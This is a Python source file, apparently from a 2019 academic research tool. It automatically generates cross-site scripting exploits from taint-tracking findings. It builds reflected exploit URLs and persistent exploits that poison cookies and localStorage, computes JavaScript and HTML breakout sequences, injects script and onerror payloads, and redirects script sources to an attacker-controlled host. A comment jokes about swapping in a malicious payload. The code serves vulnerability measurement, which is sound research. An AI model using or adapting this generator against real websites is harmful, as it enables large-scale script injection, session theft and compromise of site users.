# Copyright (C) 2019 Ben Stock & Marius Steffens
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import json
import pyesprima
from pprint import pprint

from bs4 import BeautifulSoup
from urllib import quote
from urlparse import unquote, urlsplit, urljoin

import time

from utils import manual_quote, recursive_replace, is_json, try_parse_json, log, find_match, build_reflected_exploit
from constants.sinks import SINKS
from constants.sources import SOURCES
from config import CONFIG, GENERATE_EXPLOIT_FOR_SOURCES, HTML_SINKS, JS_SINKS, SCRIPT_SOURCE_HOSTNAME

from HTML.HTMLStateMachine import getHTMLBreakout, HTMLStateMachine
from JS.JSExploitGenerator import JavaScriptExploitGenerator


def generateExploit(finding):
    """
    Call the respective generation functions according to the sink of the finding.

    :param finding: the finding which should be used to generate
    :return: list of exploit candidates
    """
    # If we have no associated sources we cannot generate anything
    if len(finding["sources"]) == 0:
        print("There were no sources present within the corresponding finding, thus we cannot generate exploits!")
        return []
    # direct flow into script src
    if finding["sink_id"] == SINKS.SINK_SCRIPT_SRC:
        print("47")
        return get_script_src_exploit(finding)
    # direct flow into string to JS code conversion sinks
    elif finding["sink_id"] in JS_SINKS:
        print("51")
        return get_js_exploit(finding)
    # indirect flow into javascript execution via HTML
    elif finding["sink_id"] == SINKS.SINK_INNER_HTML and finding["d2"] == 'script':
        print("55")
        return get_js_exploit(finding)
    # direct flow into HTML
    elif finding["sink_id"] in HTML_SINKS:
        print("59")
        return get_html_exploit(finding)
    else:
        print('It is currently not supported to build exploits for sink number {}!'.format(finding["sink_id"]))
        return []


def createWebExploit(url, source_id):
    """
    Generate a representation of an RCXSS exploit candidate given the exploit url.

    :param url: the exploit url of the RCXSS candidate
    :param source_id: the associated source_id which then allows to track the finding which was exploited
    :return: RCXSS exploit candidate
    """
    print("74")
    exploit = {
        "type": "RCXSS",
        "exploit_url": url,
        "finding_source_id": source_id,
    }
    return exploit


def createPCXSSExploit(source_name, matched_key, matched_storage_value, source_id, replace_value, replace_with):
    """
    Generate a representation of a PCXSS exploit candidate given the store and kvp to substitute.

    :param source_name: the storage type which needs to be substituted (document.cookie/localStorage)
    :param matched_key: the key which needs to be replaces
    :param matched_storage_value: the original storage value
    :param source_id: the associated source_id which then allows to track the finding which was exploited
    :param replace_value: the value part which needs to be substituted from the complete storage value
    :param replace_with: the candidate value part which needs to be inserted into the store
    :return: PCXSS exploit candidate
    """
    print("95")
    exploit = {
        "type": "PCXSS",
        "storage_type": source_name,
        "storage_key": matched_key,
        "storage_value": matched_storage_value,
        "finding_source_id": source_id,
        "replace_value": replace_value,
        "replace_with": replace_with
    }
    return exploit


def get_script_src_exploit(finding):
    """
    Generate exploit candidates which flow into the script src sink.

    :param finding: the finding to analyze
    :return: list of exploit candidates
    """
    print("115")
    exploits = []
    for source in finding["sources"]:
        print("118")
        script_src = finding["value"]
        if len(source["value_part"]) == 1:
            print("121")
            continue
        print("123")
        found = False
        original_script_src = script_src
        # we have found the complete value directly, just substitute it with a hostname under our control
        if script_src.startswith(source["value_part"]):
            print("128")
            payload = "https://" + SCRIPT_SOURCE_HOSTNAME + '/'
            found = True
        # check for relative URL
        print("132")
        if not script_src.startswith("http"):
            print("134")
            script_src = urljoin(finding["url"], script_src)
        print("136")
        parsed = urlsplit(script_src)
        if parsed.netloc == source["value_part"]:
            print("139")
            payload = SCRIPT_SOURCE_HOSTNAME + '/'
            found = True
        print("142")
        end_of_domain = len(parsed.scheme) + len("://") + len(parsed.netloc)
        script_src_diff = len(script_src) - len(original_script_src)
        # our value lies somewhere where we can influence the location
        if -1 < source["start"] + script_src_diff < end_of_domain:
            print("147")
            if source["end"] + script_src_diff < len(parsed.scheme) + len("://"):
                # but just in the protocol :(
                print("150")
                continue
            # replace the netlocation with our hostname
            print("153")
            payload = source["value_part"].replace(parsed.netloc, SCRIPT_SOURCE_HOSTNAME)
            # if it is not part of the initial value, just try to insert it anyway
            if parsed.netloc not in source["value_part"]:
                print("157")
                payload = "." + SCRIPT_SOURCE_HOSTNAME + '/'
            print("159")
            found = True
        # found = True => payload is defined
        print("162")
        if found:
            print("164")
            # if it is a reflected source, build reflected exploit candidate
            if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                        SOURCES.SOURCE_SESSION_STORAGE]:
                print("168")
                exploit_urls = build_reflected_exploit(finding, payload, source["value_part"], source["source"])
                # if it worked, we cann add it to our found exploits
                if exploit_urls is not None:
                    print("172")
                    exploits.append(createWebExploit(exploit_urls, source["id"]))
            else:
                print("175")
                # build a PCXSS exploit candidate
                # fetch the respective storage entries to check for our tainted value
                if source["source"] == SOURCES.SOURCE_COOKIE:
                    storage_items = []
                    if "storage" in finding:
                        if "cookies" in finding["storage"]:
                            storage_items = finding["storage"]["cookies"]
                else:
                    storage_items = []
                    if "storage" in finding:
                        if "storage" in finding["storage"]:
                            storage_items = finding["storage"]["storage"]

                if len(storage_items) == 0:
                    print("190")
                    # we dont have any storage items recorded, so nothing to see
                    continue
                print("193")
                matches = find_match(storage_items, source["value_part"])
                # for each match in the storage entries we can generate a candidate
                for match in matches:
                    print("197")
                    matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                    if is_json(matched_storage_value):
                        print("200")
                        parsed = try_parse_json(matched_storage_value)
                    else:
                        print("203")
                        parsed = None
                    print("205")
                    if parsed and matched_storage_value != source["value_part"]:
                        print("207")
                        # we need to replace the whole thing
                        replace_value = matched_storage_value
                        replace_with = recursive_replace(parsed,
                                                         source["value_part"],
                                                         payload)
                        replace_with = json.dumps(replace_with)
                    else:
                        print("215")
                        replace_value = matched_storage_value
                        replace_with = replace_value.replace(source["value_part"],
                                                             payload)
                    print("219")
                    if "quoted" in addinfo:
                        try:
                            replace_with = quote(replace_with)
                        except KeyError:
                            replace_with = manual_quote(replace_with)
                    # check whether the substitution was indeed successful
                    if 'alert' not in replace_with and SCRIPT_SOURCE_HOSTNAME not in replace_with:
                        print("Substitution of script source PCXSS candidate did not work!")
                    else:
                        print("229")
                        exploits.append(
                            createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                               source["id"],
                                               replace_value, replace_with))
    return exploits


def check_for_complete_flow(value, value_part, payload):
    """
    Check whether or not the value has flown completely into the sink.
    :param value: the complete value which ended up in the sink
    :param value_part: the part which orignates from the currently investigated source
    :param payload: the payload which should be executed
    :return: part that needs to be replaced,value to replace with or None,None if it is not a complete flow
    """
    print("245")
    if value == "(" + value_part + ")" or value == value_part:
        # Everything normal, direct flow
        replace_value = value_part
        replace_with = payload
    elif value == "(" + unquote(value_part) + ")" or value == unquote(value_part):
        # direct flow but value_part is quoted, gets unquoted on the way
        replace_value = quote(value_part)
        replace_with = quote(payload)
    elif value == '("' + value_part + '")':
        # break out of string
        replace_value = value_part
        replace_with = '"+' + payload + '+"'
    elif value == '("' + unquote(value_part) + '")':
        # break out of string, but get was quoted in source
        replace_value = quote(value_part)
        replace_with = quote('"+' + payload + '+"')
    else:
        return None, None
    return replace_value, replace_with


def get_complete_exploits(finding, source, value, value_part, payload):
    """
    Check whether we have an easy case where a value originating from a source
    ends up directly into the sink without any modifications
    :param finding: the finding to investigate
    :param source: the source from which the flow originates
    :param value: the complete value which ended up in the sink
    :param value_part: the value part of the currently investigated source
    :param payload: the payload which should be executed
    :return: list of exploit candidates if a complete flow was found, empty list otherwise
    """
    print("278")
    complete_replace_value, complete_replace_with = check_for_complete_flow(value, value_part, payload)
    if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                SOURCES.SOURCE_SESSION_STORAGE] and complete_replace_value:
        # Web Attacker
        print("283")
        exploit_url = build_reflected_exploit(finding, complete_replace_with, complete_replace_value,
                                              source["source"])
        if exploit_url is None:
            print("287")
            return []
        else:
            print("289")
            return [createWebExploit(exploit_url, source["id"])]
    elif complete_replace_value:
        # Network Attacker
        # select the appropriate storage items to look at
        print("295")
        if source["source"] == SOURCES.SOURCE_COOKIE:
            storage_items = []
            if "storage" in finding:
                if "cookies" in finding["storage"]:
                    storage_items = finding["storage"]["cookies"]
        else:
            storage_items = []
            if "storage" in finding:
                if "storage" in finding["storage"]:
                    storage_items = finding["storage"]["storage"]
        print("306")
        if complete_replace_value and complete_replace_with:
            # we have a complete flow, just need to find the corresponding keys
            print("309")
            matches = find_match(storage_items, complete_replace_value)
            complete_exploits = []
            for match in matches:
                print("313")
                matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                # not exploitable but widespread
                if matched_key in ("_parsely_visitor", "_parsely_session"):
                    print("317")
                    continue
                # if the storage value is quoted,
                print("320")
                new_replace_with = complete_replace_with
                if "quoted" in addinfo:
                    try:
                        print("324")
                        new_replace_with = quote(complete_replace_with)
                    except KeyError:
                        print("327")
                        new_replace_with = manual_quote(complete_replace_with)
                print("329")
                complete_exploits.append(
                    createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                       source["id"], matched_value,
                                       new_replace_with))
            print("Found a complete flow and could replace it in the storage entry")
            return complete_exploits
    return []


def get_js_exploit(finding):
    """
    Generate exploits for a JavaScript executing sink.
    :param finding: the finding to investigate
    :return: list of exploit candidates
    """
    # widespread but not exploitable
    print("341")
    if finding["value"] == '("__storejs__")':
        print("348")
        return []

    exploits = list()
    for source in finding["sources"]:
        print("353")
        value = finding["value"]
        value_part = source["value_part"]
        complete_exploits = get_complete_exploits(finding, source, value, value_part, CONFIG.payload)
        if len(complete_exploits):
            print("358")
            print("Complete exploit: %s, tainted: %s" % (complete_exploits, source["value_part"]))
            return complete_exploits
        
    print("361")
    complete_generator = JavaScriptExploitGenerator()
    payload_validator = JavaScriptExploitGenerator()

    try:
        print("367")
        parsed_value = pyesprima.parse(finding["value"], range=True)
        complete_generator.traverse_ast_generic(parsed_value, None)
    except RuntimeError, e:
        print("371")
        print(str(e))
        return []

    # there are findings in which we have plenty sources which are just generating duplicate exploits
    # will only be vulnerable if a predecessor is also vulnerable, thus restrict to the 20 first
    print("377")
    for source in finding["sources"][:20]:
        print("379")
        # value part of the current source
        value_part = source["value_part"]
        # complete value which has flown into the sink
        value = finding["value"]

        # values being protocols are not likely to produce exploitable flows, thus quick exit
        if value_part in ('http:', 'https:'):
            print("387")
            continue

        # If we found a source which originates from a source which we do not currently consider preempt
        print("391")
        if source["source"] not in GENERATE_EXPLOIT_FOR_SOURCES or source["hasEscaping"] + \
                source["hasEncodingURI"] + source["hasEncodingURIComponent"] > 0:
            print("394")
            log("Skipping source with source_id {}!".format(source["source"]))
            continue

        # fetch the appropriate storage entry
        print("399")
        if source["source"] == SOURCES.SOURCE_COOKIE:
             storage_items = []
             if "storage" in finding:
                 if "cookies" in finding["storage"]:
                     storage_items = finding["storage"]["cookies"]
        elif source["source"] in (SOURCES.SOURCE_LOCAL_STORAGE, SOURCES.SOURCE_SESSION_STORAGE):
            storage_items = []
            if "storage" in finding:
                if "storage" in finding["storage"]:
                    storage_items = finding["storage"]["storage"]
        else:
            storage_items = []

        try:
            # if the value part consists of a tokenizable JavaScript string we can just substitute our payload
            # since there are cases in which data can be tokenized into multiple tokens, especially in the presence of
            # numbers we have 10 tokens as a cutoff
            print("417")
            parsed = pyesprima.tokenize(value_part)
            if len(parsed) > 10:
                # likely just it's own JS program
                print("421")
                matches = find_match(storage_items, value_part)
                for match in matches:
                    print("424")
                    matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                    # again widespread but not vulnerable
                    if matched_key in ("_parsely_visitor", "_parsely_session"):
                        print("428")
                        continue
                    print("430")
                    exploits.append(
                        createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                           source["id"],
                                           value_part, CONFIG.payload))
        except Exception, e:
            # it was not tokenizable so just continue with the normal routine
            print("437")
            print(e)
            pass

        # flow not encoded
        print("442")
        tainted_start = source['start']
        tainted_end = tainted_start + len(value_part)

        if value_part != value[tainted_start:tainted_end]:
            print("447")
            # this can happen if we lost characters due to encoding. In that case, we have to search for the value
            # instead of relying on the original offset
            tainted_start = value.find(value_part)
            tainted_end = tainted_start + len(value_part)
            print('Mismatch in taint start info')

        print("454")
        # we did not find a complete match, thus we resort to partial breakouts
        tainted_path, matched_start, matched_end = complete_generator.find_tainted_path(
            tainted_start, tainted_end)
        # get breakout sequence
        breakout = complete_generator.create_exploit_from_path(
            tainted_path, matched_start, matched_end, value)

        # We are looking at the context from which we are breaking out
        if len(breakout) and breakout[-1] != ';':
            breakout += ";"
        elif len(breakout) == 0 and value[matched_end - 1] != ";":
            breakout += ";"

        # nothing matched
        if matched_start == 0 and matched_end == 0:
            continue

        print("Going the normal way")

        # create the according value which is to be replaced
        # resort to string concatenation where possible
        print("476")
        if len(breakout) and (breakout.endswith("';") or breakout.endswith('";')) \
                and source["source"] == SOURCES.SOURCE_COOKIE:
            replace_value = value[:matched_end]
            replace_with = replace_value + breakout[:-1] + "+" + CONFIG.payload + "+" + breakout[-2]
            payload = breakout[:-1] + "+" + CONFIG.payload + "+" + breakout[-2]
            code = replace_with + value[matched_end:]
        elif len(breakout) and \
                ((breakout.startswith('#"') or breakout.startswith("#'")) or breakout[0] in ("'", '"')) \
                and '\n' in value[matched_end:]:
            replace_value = value[:matched_end]
            if breakout[0] == '#':
                payload = breakout[:2] + "+" + CONFIG.payload + "+" + breakout[1]
            else:
                payload = breakout[0] + "+" + CONFIG.payload + "+" + breakout[0]
            replace_with = replace_value + payload
            code = replace_with + value[matched_end:]
        elif breakout == ";" and source["source"] == SOURCES.SOURCE_COOKIE:
            replace_value = value[:matched_end]
            replace_with = replace_value + "+" + CONFIG.payload + "//"
            payload = "+" + CONFIG.payload + "//"
            code = replace_with + value[matched_end:]
        else:
            replace_value = value[:matched_end]
            replace_with = replace_value + breakout + CONFIG.payload + "//"
            payload = breakout + CONFIG.payload + "//"
            code = replace_with + value[matched_end:]

            print("504")
        print("breakout: %s, source: %s" % (breakout, source["source_name"]))

        # check for validity of our generated code
        assert code != value, "No diff!"
        
        
        try:
            print("512")
            # recheck that substituted values are still valid JS
            #print(code)
            parsed_exploit = pyesprima.parse(code, range=True)
        except RuntimeError, e:
            print("517")
            print(str(e))
            print('JavaScript payload refuses to parse after substitution!')
            continue
        print("520")
        payload_validator.reset()
        payload_validator.traverse_ast_generic(parsed_exploit, None)
        # check for executability of our payload
        if not payload_validator.check_for_js_exploit(CONFIG.payload):
            print("525")
            log("Javascript payload was not found to be executable after substitution!")
            continue

        # actually start building exploits after we have generated the correct breakout + payload
        print("530")
        if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                    SOURCES.SOURCE_SESSION_STORAGE]:
            # RCXSS
            print("534")
            exploit_url = build_reflected_exploit(finding,
                                                  source["value_part"] + payload,
                                                  source["value_part"], source["source"])
            if exploit_url is None:
                print("539")
                print('Unable to generate exploit URL for JS RCXSS!')
                continue
            else:
                print("542")
                exploits.append(createWebExploit(exploit_url, source["id"]))
        else:
            # PCXSS
            print("547")
            if len(storage_items) == 0:
                matches = None
            else:
                matches = find_match(storage_items, value_part)
            # heuristic to check if a cookie has flown directly into the sink, then we can just add an arbitrary cookie
            print("553")
            if matches is None and source["source"] == SOURCES.SOURCE_COOKIE and ";" in value_part:
                print("555")
                # document.cookie komplett -> sink
                exploits.append(
                    createPCXSSExploit(source["source_name"], "___foobar___", None, source["id"],
                                       replace_value,
                                       replace_with))
            # we cannot find matches
            elif matches is None:
                print("563")
                print('Could not find the respective storage entry for a JS PCXSS exploit!')
            # we actually have matches
            else:
                print("567")
                for match in matches:
                    print("569")
                    matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                    # TODO merge with previous same code
                    if matched_key in ("_parsely_visitor", "_parsely_session"):
                        continue
                    if is_json(matched_storage_value):
                        parsed = try_parse_json(matched_storage_value)
                    else:
                        parsed = None
                    if is_json(source["value_part"]):
                        parsed_value = try_parse_json(source["value_part"])
                    else:
                        parsed_value = None
                    # check if both are dicts, if so => eval(dict) case
                    if isinstance(parsed, dict) and isinstance(parsed_value, dict):
                        print("584")
                        if parsed.keys() == parsed_value.keys():
                            print("586")
                            # same keys, we can simply replace the whole string
                            replace_with = CONFIG.payload
                            if "quoted" in addinfo:
                                replace_with = quote(replace_with)
                            replace_value = matched_storage_value
                            exploits.append(
                                createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                                   source["id"],
                                                   replace_value,
                                                   replace_with))

                            continue
                    # only storage value is a dict, thus we need to replace the value recursively into the dict
                    print("600")
                    if isinstance(parsed, dict):
                        print("602")
                        replace_value = matched_storage_value
                        replace_with = recursive_replace(parsed,
                                                         source["value_part"],
                                                         source["value_part"] + payload)
                        replace_with = json.dumps(replace_with)
                    # the storage value is not a dictionary, thus resort to normal string replace
                    else:
                        print("610")
                        replace_value = matched_storage_value
                        replace_with = replace_value.replace(source["value_part"],
                                                             source["value_part"] + payload)

                    if "quoted" in addinfo:
                        replace_with = quote(replace_with)
                    if replace_with == replace_value:
                        continue
                    # FIXME what could possibly go wrong here if you change the payload to something malicious ;)
                    if "alert" not in replace_with and "persistent" not in replace_with:
                        print('Failed to find js exploit after substitution for PCXSS JS exploit!')
                        continue
                    print("623")
                    exploits.append(
                        createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                           source["id"],
                                           replace_value, replace_with))
    print("628")
    return exploits


def get_html_exploit(finding):
    """
    Generate exploits for an HTML executing sink.
    :param finding: the finding to investigate
    :return: list of exploit candidates
    """
    print("638")
    exploits = list()
    # our payload is a piece of Javascript, thus we need to prepare it into an HTML payload first
    validation_payload = CONFIG.payload
    payload = "<img src=foo onerror=%s onload=%s>" % (validation_payload, validation_payload)
    # textareas are the easiest way to breakin into HTML
    # since they catch anything up to the the closing tag of the current environment
    breakin = "<textarea>"
    # in instances where we can write script tags we can also simply resort to this simpler case
    print("647")
    if finding["sink_id"] in [SINKS.SINK_DOC_WRITE, SINKS.SINK_IFRAME_SRCDOC]:
        print("649")
        payload = "<script>%s</script>" % validation_payload
    try:
        # start generating the appropriate breakouts
        print("653")
        parser = HTMLStateMachine()
        prior_parsed = 0
        # there are findings in which we have plenty sources which are just generating duplicate exploits
        # will only be vulnerable if a predecessor is also vulnerable, thus restrict to the 20 first
        for source in finding["sources"][:20]:
            print("659")
            # the complete value ending up in the sink
            value = finding["value"]
            # the specific part of the value originating from this source
            value_part = source["value_part"]

            # skip unreasonable values/sources which are not considered in our exploitation
            if source["value_part"] == "?":
                continue
            if source["source"] not in GENERATE_EXPLOIT_FOR_SOURCES:
                print("Skipping source with source_id {}!".format(source["source"]))
                continue
            if source["hasEscaping"] + source["hasEncodingURI"] + source["hasEncodingURIComponent"] > 0:
                print("Skipping source with encoding!")
                continue

            # offsets in the overall value
            taint_start, taint_end = source["start"], source["end"]

            # if this is not the case we have encoding problems in which case some bytes might be missing
            # thus we need to recalc the offset
            print("680")
            if value_part != value[taint_start:taint_end]:
                if value.count(value_part) == 1:
                    taint_start = value.find(value_part)
                    taint_end = taint_start + len(value_part)
                    print('Mismatch in taint start info %s %s' % (taint_start, len(value)))
                else:
                    continue
            # get the string part which resides between the current source and the prior parsed part of the string
            # then feed it into our state machine and use the resulting state as basis to generate the breakout
            string_to_parse = finding["value"][prior_parsed:taint_start] + source["value_part"]
            prior_parsed = taint_end

            print("Getting HTML breakout for %s (%s): %s" % (source["id"], string_to_parse, value_part))
            # feeds the string to the parser and then outputs the breakout sequence
            breakout_sequence = getHTMLBreakout(parser, string_to_parse)
            print("Result: %s" % breakout_sequence)

            # TODO (ben) fix this bridge, not only rcxss but also pcxss and if we have only seen / we can do stuff
            # check if we are currently in the process of writing the src property of a script tag which we can hijack
            print("700")
            if len(parser.opened_tags) > 0:
                print("702")
                top_element = parser.opened_tags[0]
                if top_element.get("name", "").lower() == 'script' and len(top_element.get("attributes", [])):
                    if (top_element.get("attributes")[0]).get("name", "") == 'src':
                        url_so_far = urljoin(finding["url"], top_element["attributes"][0]["value"])
                        if url_so_far.count("/") < 3:
                            # we control the origin, woohoo
                            parsed = urlsplit(url_so_far)
                            if parsed.netloc in source["value_part"] or source["value_part"] in parsed.netloc:
                                payload = source["value_part"].replace(parsed.netloc, SCRIPT_SOURCE_HOSTNAME)
                                breakout_sequence = ""
                                print("713")
                                exploit_url = build_reflected_exploit(finding,
                                                                      payload,
                                                                      source["value_part"], source["source"])
                                if exploit_url:
                                    exploits.append(createWebExploit(exploit_url, source["id"]))
                                    continue
            # We have a generated a breaout sequence and can make use of it now
            print("721")
            if breakout_sequence is not None:
                print("723")
                if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                            SOURCES.SOURCE_SESSION_STORAGE]:
                    # RCXSS
                    # assemble the complete exploit candidate
                    print("728")
                    resulting_markup = value[:taint_start] + source[
                        "value_part"] + breakout_sequence + payload + breakin + value[taint_end:]
                    assert resulting_markup != value
                    working_exploit = False
                    # check for exploitability
                    try:
                        print("735")
                        soup = BeautifulSoup(resulting_markup, "html5lib")
                        for script in soup.find_all("script"):
                            print("738")
                            # either we are injected into a script
                            if script.text:
                                print("741")
                                if script.text == validation_payload:
                                    working_exploit = True
                            # or part of a script src
                            print("745")
                            if "src" in script.attrs:
                                print("747")
                                parsed = urlsplit(script["src"])
                                if parsed.netloc.endswith(SCRIPT_SOURCE_HOSTNAME):
                                    print("750")
                                    working_exploit = True
                        # or into the onload/onerror of an image
                        print("753")
                        for img in soup.find_all("img"):
                            print("755")
                            if "onload" in img.attrs and img["onload"].strip() == validation_payload:
                                print("757")
                                working_exploit = True
                    except Exception, e:
                        print("760")
                        print('Error in parsing resulting payload of an HTML exploit {}'.format(e))
                    # We were not able to find our payload thus also we do not need to validate
                    if not working_exploit:
                        print("764")
                        print("After substitution of HTML exploit, payload was non functional!")
                        continue

                    # we are building exploits for reflected source thus build the respective urls
                    print("769")
                    exploit_url = build_reflected_exploit(finding,
                                                          source["value_part"] + breakout_sequence + payload + breakin,
                                                          source["value_part"], source["source"])
                    print("773")
                    if exploit_url is None:
                        print("775")
                        print('Unable to generate exploit URL for HTML RCXSS!')
                        continue
                    else:
                        print("779")
                        exploits.append(createWebExploit(exploit_url, source["id"]))
                else:
                    # PCXSS
                    # select the appropriate storage
                    print("784")
                    if source["source"] == SOURCES.SOURCE_COOKIE:
                        storage_items = []
                        if "storage" in finding:
                            if "cookies" in finding["storage"]:
                                storage_items = finding["storage"]["cookies"]
                    else:
                        storage_items = []
                        if "storage" in finding:
                            if "storage" in finding["storage"]:
                                storage_items = finding["storage"]["storage"]
                    print("795")
                    if len(storage_items) == 0:
                        matches = None
                    else:
                        matches = find_match(storage_items, value_part)

                    if matches is None and source["source"] == SOURCES.SOURCE_COOKIE and ";" in value_part:
                        # document.cookie directly into sink
                        print("803")
                        exploits.append(
                            createPCXSSExploit(source["source_name"], "___foobar___", None, source["id"],
                                               None,
                                               payload + breakin))

                    elif matches is None:
                        print("810")
                        print('Could not find the respective storage entry for an HTML PCXSS exploit!')
                    else:
                        # we actually have matches
                        print("814")
                        for match in matches:
                            print("816")
                            matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                            # TODO merge with above
                            if matched_key in ("_parsely_visitor", "_parsely_session"):
                                continue

                            if is_json(matched_storage_value):
                                parsed = try_parse_json(matched_storage_value)
                            else:
                                parsed = None

                            # storage value is a dict
                            if parsed:
                                replace_value = matched_storage_value
                                replace_with = recursive_replace(parsed,
                                                                 source["value_part"],
                                                                 source["value_part"] + breakout_sequence +
                                                                 payload + breakin)
                                replace_with = json.dumps(replace_with)
                            # the storage value is not a dictionary
                            else:
                                replace_value = matched_storage_value
                                replace_with = replace_value.replace(source["value_part"],
                                                                     source["value_part"] + breakout_sequence +
                                                                     payload + breakin)
                            if "quoted" in addinfo:
                                try:
                                    replace_with = quote(replace_with)
                                except KeyError:
                                    replace_with = manual_quote(replace_with)
                            if replace_with == replace_value:
                                continue
                            # FIXME what could possibly go wrong here if you change the payload to something malicious ;)
                            if "alert" not in replace_with and "persistent" not in replace_with:
                                print("850")
                                print('Failed to find HTML exploit after substitution for PCXSS JS exploit!')
                                continue
                            exploits.append(
                                createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                                   source["id"],
                                                   replace_value, replace_with))

    except Exception as e:
        print("859")
        print("ERR {} {}".format(e, finding["finding_id"]))
    print("861")
    return exploits


def fixFlow(finding):
    if "sources" in finding:
        i = 0
        while i < len(finding["sources"]):
            if "hasEncodeURI" in finding["sources"][i]:
                finding["sources"][i]["hasEncodingURI"] = finding["sources"][i]["hasEncodeURI"]

            if "hasEncodeURIComponent" in finding["sources"][i]:
                finding["sources"][i]["hasEncodingURIComponent"] = finding["sources"][i]["hasEncodeURIComponent"]

            if "id" not in finding["sources"][i]:
                finding["sources"][i]["id"] = 0;
            i+=1

    return finding


def generate_exploit_for_finding(finding):
    """
    Main entry function which generates exploit candidates for a given finding.
    :param finding: the finding to investigate
    :return: list of exploit candidates
    """
    # main entry point for the generation of findings
    
    print("Starting generation for finding {}!".format(finding["finding_id"]))
    start = time.time()
    finding = fixFlow(finding)
    result = generateExploit(finding)
    stop = time.time()
    print("Finished finding {} in {} seconds!".format(finding["finding_id"], stop - start))
    return result
